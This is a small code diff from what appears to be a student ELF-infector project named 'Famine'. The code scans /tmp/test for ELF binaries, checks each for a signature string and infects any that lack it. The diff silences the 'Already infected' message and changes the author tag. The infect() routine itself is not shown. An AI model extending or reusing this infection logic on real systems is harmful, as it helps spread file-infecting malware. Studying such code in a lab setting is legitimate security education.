@@ -57,8 +57,8 @@ void analyze_directory(const char *dirname, const char *string, size_t len)
                 //printf("Its elf: %s\n", path);
                 if (!check_infection(fp, string, len - 1))
                     infect(fp, string, len);
-                else
-                    printf("Already infected.\n");
+                //else
+                    //printf("Already infected.\n");
             }
             fclose(fp);
         }
@@ -68,7 +68,7 @@ void analyze_directory(const char *dirname, const char *string, size_t len)
 
 void run_infection()
 {
-    const char *string = "Famine version 1.0 (c)oded by fvieira-login2";
+    const char *string = "Famine version 1.0 (c)oded by fvieira-jegger-s";
     size_t len = strlen(string) + 1;
 
     analyze_directory("/tmp/test", string, len);
